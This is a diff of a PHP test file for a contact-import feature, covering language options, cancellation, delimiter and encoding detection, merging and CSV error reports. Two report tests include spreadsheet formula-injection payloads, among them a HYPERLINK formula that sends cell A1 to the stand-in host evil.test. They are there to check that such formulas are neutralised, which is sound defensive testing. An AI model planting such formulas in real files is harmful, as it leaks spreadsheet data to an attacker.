@@ -2,6 +2,7 @@
 
 use App\Enums\ContactImportMergeStrategy;
 use App\Enums\ContactImportStatus;
+use App\Enums\SubscriberLanguage;
 use App\Enums\SubscriberStatus;
 use App\Enums\TeamRole;
 use App\Jobs\ProcessContactImport;
@@ -123,6 +124,25 @@ test('starting an import requires an email column and unique fields', function (
     'duplicate field' => [['email', 'email'], 'Each field can only be mapped to one column.'],
 ]);
 
+test('audience imports save a language for rows without one', function () {
+    Queue::fake([ProcessContactImport::class]);
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $audience = Audience::factory()->for($user->currentTeam)->create(['allowed_languages' => ['en', 'id']]);
+    $contactImport = draftImport($user->currentTeam, "email\nada@example.com\n", ['audience_id' => $audience->id]);
+
+    $this->actingAs($user)
+        ->post(route('contacts.imports.start', [$user->currentTeam, $contactImport]), [
+            'column_map' => ['email'],
+            'merge_strategy' => 'skip',
+            'language' => 'id',
+            'consent_confirmed' => true,
+        ])
+        ->assertSessionHasNoErrors();
+
+    expect($contactImport->refresh()->language)->toBe(SubscriberLanguage::Indonesian);
+});
+
 test('audience imports require consent confirmation before starting', function () {
     Queue::fake([ProcessContactImport::class]);
     Storage::fake('local');
@@ -185,6 +205,7 @@ test('the import page shows mapping options for a draft', function () {
             ->component('contacts/imports/show')
             ->where('contactImport.status', 'draft')
             ->where('mapping.headers', ['email', 'first'])
+            ->where('mapping.delimiter', ',')
             ->where('mapping.columnMap', ['email', 'first_name'])
             ->where('canManage', true));
 });
@@ -351,6 +372,27 @@ test('cancelled imports stop processing and remove the uploaded file', function 
     Storage::disk('local')->assertMissing($contactImport->path);
 });
 
+test('cancelling an import while a chunk runs stops before the next row and keeps it cancelled', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+    $contactImport = draftImport($team, "email\none@example.com\ntwo@example.com\nthree@example.com\n", [
+        'column_map' => ['email'],
+        'status' => ContactImportStatus::Pending,
+    ]);
+    Contact::created(function (Contact $contact) use ($user, $team, $contactImport): void {
+        if ($contact->email === 'one@example.com') {
+            $this->actingAs($user)->post(route('contacts.imports.cancel', [$team, $contactImport]));
+        }
+    });
+
+    runImport($contactImport);
+
+    expect($contactImport->status)->toBe(ContactImportStatus::Cancelled)
+        ->and($team->contacts()->pluck('email')->all())->toBe(['one@example.com']);
+    Storage::disk('local')->assertMissing($contactImport->path);
+});
+
 test('the import report downloads failed and flagged rows as a CSV', function () {
     Storage::fake('local');
     $user = User::factory()->create();
@@ -367,7 +409,7 @@ test('the import report downloads failed and flagged rows as a CSV', function ()
         ->assertDownload('leads-report.csv');
 
     expect($response->streamedContent())->toBe(
-        "row,email,outcome,detail\n3,broken,failed,\"Invalid email address.\"\n4,ada@gmial.com,fixed,\"Possible typo ada@gmail.com\"\n",
+        "\xEF\xBB\xBFrow,email,outcome,detail\n3,broken,failed,\"Invalid email address.\"\n4,ada@gmial.com,fixed,\"Possible typo ada@gmail.com\"\n",
     );
 });
 
@@ -386,7 +428,7 @@ test('the import report neutralises spreadsheet formulas from failed rows', func
         ->assertOk();
 
     expect($response->streamedContent())->toBe(
-        "row,email,outcome,detail\n3,\"'=HYPERLINK(\"\"http://evil.test/?\"\"&A1;\"\"x\"\")\",failed,\"Invalid email address.\"\n",
+        "\xEF\xBB\xBFrow,email,outcome,detail\n3,\"'=HYPERLINK(\"\"http://evil.test/?\"\"&A1;\"\"x\"\")\",failed,\"Invalid email address.\"\n",
     );
 });
 
@@ -498,4 +540,253 @@ test('starting an import rejects a check action the check does not offer', funct
         ->assertSessionHasErrors('review_options.disposable');
 
     Queue::assertNothingPushed();
+});
+
+test('audience imports refuse a language the audience does not offer', function () {
+    Queue::fake([ProcessContactImport::class]);
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $audience = Audience::factory()->for($user->currentTeam)->create(['allowed_languages' => ['en']]);
+    $contactImport = draftImport($user->currentTeam, "email\nada@example.com\n", ['audience_id' => $audience->id]);
+
+    $this->actingAs($user)
+        ->post(route('contacts.imports.start', [$user->currentTeam, $contactImport]), [
+            'column_map' => ['email'],
+            'merge_strategy' => 'skip',
+            'language' => 'id',
+            'consent_confirmed' => true,
+        ])
+        ->assertSessionHasErrors('language');
+
+    expect($contactImport->refresh()->language)->toBeNull();
+});
+
+test('uploads read a quoted first header after an Excel byte order mark', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+
+    $this->actingAs($user)
+        ->post(route('contacts.imports.store', $team), [
+            'file' => UploadedFile::fake()->createWithContent(
+                'excel-utf8.csv',
+                "\xEF\xBB\xBF\"Email\",\"Name, full\"\nada@example.com,\"Lovelace, Ada\"\n",
+            ),
+        ])
+        ->assertSessionHasNoErrors();
+    $contactImport = $team->contactImports()->sole();
+    $this->actingAs($user)
+        ->post(route('contacts.imports.start', [$team, $contactImport]), [
+            'column_map' => $contactImport->column_map,
+            'merge_strategy' => 'skip',
+        ])
+        ->assertSessionHasNoErrors();
+
+    expect($contactImport->refresh()->headers)->toBe(['Email', 'Name, full'])
+        ->and($contactImport->column_map)->toBe(['email', null])
+        ->and($contactImport->status)->toBe(ContactImportStatus::Completed)
+        ->and($team->contacts()->pluck('email')->all())->toBe(['ada@example.com']);
+});
+
+test('uploads ignore delimiters inside quoted headers when detecting the delimiter', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+
+    $this->actingAs($user)
+        ->post(route('contacts.imports.store', $team), [
+            'file' => UploadedFile::fake()->createWithContent(
+                'excel-de.csv',
+                "E-Mail;\"Name, Vorname, Titel\"\nada@example.com;\"Lovelace, Ada, Countess\"\n",
+            ),
+        ])
+        ->assertSessionHasNoErrors();
+
+    expect($team->contactImports()->sole()->only(['delimiter', 'headers']))->toBe([
+        'delimiter' => ';',
+        'headers' => ['E-Mail', 'Name, Vorname, Titel'],
+    ]);
+});
+
+test('a draft whose mapped audience field was deleted shows it unmapped and refuses to start with a visible error', function () {
+    Queue::fake([ProcessContactImport::class]);
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+    $audience = Audience::factory()->for($team)->create();
+    $contactImport = draftImport($team, "email,plan\nada@example.com,pro\n", [
+        'audience_id' => $audience->id,
+        'column_map' => ['email', 'attribute:plan'],
+    ]);
+
+    $this->actingAs($user)
+        ->get(route('contacts.imports.show', [$team, $contactImport]))
+        ->assertInertia(fn (Assert $page) => $page->where('mapping.columnMap', ['email', null]));
+    $this->actingAs($user)
+        ->post(route('contacts.imports.start', [$team, $contactImport]), [
+            'column_map' => ['email', 'attribute:plan'],
+            'merge_strategy' => 'skip',
+            'consent_confirmed' => true,
+        ])
+        ->assertSessionHasErrors(['column_map' => 'A mapped field no longer exists. Choose what each column holds again.']);
+
+    expect($contactImport->refresh()->status)->toBe(ContactImportStatus::Draft);
+    Queue::assertNothingPushed();
+});
+
+test('fill blanks counts a member whose attributes already hold the values as a duplicate', function () {
+    Storage::fake('local');
+    $team = Team::factory()->create();
+    $audience = Audience::factory()->for($team)->create();
+    AudienceAttribute::factory()->for($audience)->create(['name' => 'Plan', 'key' => 'plan']);
+    AudienceAttribute::factory()->for($audience)->create(['name' => 'Seats', 'key' => 'seats']);
+    $subscriber = Subscriber::factory()->for($audience)
+        ->for(Contact::factory()->for($team)->state(['email' => 'ada@example.com']))
+        ->create(['email' => 'ada@example.com', 'attribute_values' => ['plan' => 'pro', 'seats' => '5']]);
+    $contactImport = draftImport($team, "email,seats\nada@example.com,5\n", [
+        'audience_id' => $audience->id,
+        'column_map' => ['email', 'attribute:seats'],
+        'merge_strategy' => ContactImportMergeStrategy::FillBlanks,
+        'status' => ContactImportStatus::Pending,
+    ]);
+
+    $contactImport = runImport($contactImport);
+
+    expect($contactImport->only(['updated_contacts', 'duplicate_rows']))->toBe(['updated_contacts' => 0, 'duplicate_rows' => 1])
+        ->and($subscriber->refresh()->attribute_values)->toBe(['plan' => 'pro', 'seats' => '5']);
+});
+
+test('fill blanks fills empty attributes beside nested values the API stored', function () {
+    Storage::fake('local');
+    $team = Team::factory()->create();
+    $audience = Audience::factory()->for($team)->create();
+    AudienceAttribute::factory()->for($audience)->create(['name' => 'Plan', 'key' => 'plan']);
+    $subscriber = Subscriber::factory()->for($audience)
+        ->for(Contact::factory()->for($team)->state(['email' => 'ada@example.com']))
+        ->create(['email' => 'ada@example.com', 'attribute_values' => ['utm' => ['source' => 'ads']]]);
+    $contactImport = draftImport($team, "email,plan\nada@example.com,pro\nbob@example.com,free\n", [
+        'audience_id' => $audience->id,
+        'column_map' => ['email', 'attribute:plan'],
+        'merge_strategy' => ContactImportMergeStrategy::FillBlanks,
+        'status' => ContactImportStatus::Pending,
+    ]);
+
+    $contactImport = runImport($contactImport);
+
+    expect($contactImport->status)->toBe(ContactImportStatus::Completed)
+        ->and($contactImport->updated_contacts)->toBe(1)
+        ->and($subscriber->refresh()->attribute_values)->toBe(['utm' => ['source' => 'ads'], 'plan' => 'pro'])
+        ->and($audience->subscribers()->count())->toBe(2);
+});
+
+test('the import report lists every failed row beyond the page preview', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+    $rows = ['email'];
+
+    for ($row = 1; $row <= 502; $row++) {
+        $rows[] = 'broken'.$row;
+    }
+
+    $contactImport = runImport(draftImport($team, implode("\n", $rows)."\n", [
+        'column_map' => ['email'],
+        'status' => ContactImportStatus::Pending,
+    ]));
+
+    $lines = explode("\n", trim($this->actingAs($user)
+        ->get(route('contacts.imports.report', [$team, $contactImport]))
+        ->streamedContent()));
+
+    expect($contactImport->failed_rows)->toBe(502)
+        ->and($contactImport->rowErrors())->toHaveCount(500)
+        ->and($lines)->toHaveCount(503)
+        ->and($lines[502])->toBe('503,broken502,failed,"Invalid email address."');
+});
+
+test('the import report neutralises spreadsheet formulas taken from the uploaded file', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $contactImport = runImport(draftImport($user->currentTeam, "email\n\"=HYPERLINK(\"\"https://evil.example\"\")\"\n@SUM(1+1)\n", [
+        'column_map' => ['email'],
+        'status' => ContactImportStatus::Pending,
+    ]));
+
+    $content = $this->actingAs($user)
+        ->get(route('contacts.imports.report', [$user->currentTeam, $contactImport]))
+        ->streamedContent();
+
+    expect($content)->toBe(
+        "\xEF\xBB\xBFrow,email,outcome,detail\n2,\"'=hyperlink(\"\"https://evil.example\"\")\",failed,\"Invalid email address.\"\n3,'@sum(1+1),failed,\"Invalid email address.\"\n",
+    );
+});
+
+test('uploads read UTF-16, CR-only and sep= files and skip leading blank lines', function (string $contents, string $delimiter) {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+
+    $this->actingAs($user)
+        ->post(route('contacts.imports.store', $team), [
+            'file' => UploadedFile::fake()->createWithContent('contacts.csv', $contents),
+        ])
+        ->assertSessionHasNoErrors();
+    $contactImport = $team->contactImports()->sole();
+    $this->actingAs($user)
+        ->post(route('contacts.imports.start', [$team, $contactImport]), [
+            'column_map' => $contactImport->column_map,
+            'merge_strategy' => 'skip',
+        ])
+        ->assertSessionHasNoErrors();
+
+    expect($contactImport->refresh()->only(['delimiter', 'headers', 'total_rows']))->toBe([
+        'delimiter' => $delimiter,
+        'headers' => ['email', 'first_name'],
+        'total_rows' => 2,
+    ])
+        ->and($team->contacts()->orderBy('email')->pluck('first_name', 'email')->all())
+        ->toBe(['ada@example.com' => 'Ada', 'zoe@example.com' => 'Zoë']);
+})->with([
+    'UTF-16 with a byte order mark' => ["\xFF\xFE".mb_convert_encoding("email\tfirst_name\r\nada@example.com\tAda\r\nzoe@example.com\tZoë\r\n", 'UTF-16LE', 'UTF-8'), "\t"],
+    'UTF-16 without a byte order mark' => [mb_convert_encoding("email,first_name\nada@example.com,Ada\nzoe@example.com,Zoë\n", 'UTF-16LE', 'UTF-8'), ','],
+    'CR-only line endings' => ["email,first_name\rada@example.com,Ada\rzoe@example.com,Zoë\r", ','],
+    'an Excel sep= line' => ["sep=|\nemail|first_name\nada@example.com|Ada\nzoe@example.com|Zoë\n", '|'],
+    'leading blank lines' => ["\n\r\n  \nemail;first_name\nada@example.com;Ada\nzoe@example.com;Zoë\n", ';'],
+]);
+
+test('a draft can be re-read with the delimiter the user picks', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+    $contactImport = draftImport($team, "email;first_name\nada@example.com;Ada\n", ['column_map' => [null]]);
+
+    $this->actingAs($user)
+        ->put(route('contacts.imports.delimiter', [$team, $contactImport]), ['delimiter' => ';'])
+        ->assertRedirect(route('contacts.imports.show', [$team, $contactImport]));
+
+    expect($contactImport->refresh()->only(['delimiter', 'headers', 'sample_rows', 'column_map', 'total_rows']))->toBe([
+        'delimiter' => ';',
+        'headers' => ['email', 'first_name'],
+        'sample_rows' => [['ada@example.com', 'Ada']],
+        'column_map' => ['email', 'first_name'],
+        'total_rows' => 1,
+    ]);
+});
+
+test('the delimiter can only be one of the supported ones and only on a draft', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $team = $user->currentTeam;
+    $draft = draftImport($team, "email\nada@example.com\n");
+    $started = draftImport($team, "email\nada@example.com\n", ['status' => ContactImportStatus::Pending]);
+
+    $this->actingAs($user)
+        ->put(route('contacts.imports.delimiter', [$team, $draft]), ['delimiter' => ':'])
+        ->assertSessionHasErrors(['delimiter' => 'Choose comma, semicolon, tab or pipe.']);
+    $this->actingAs($user)
+        ->put(route('contacts.imports.delimiter', [$team, $started]), ['delimiter' => ';'])
+        ->assertConflict();
+
+    expect($draft->refresh()->delimiter)->toBe(',')
+        ->and($started->refresh()->delimiter)->toBe(',');
 });
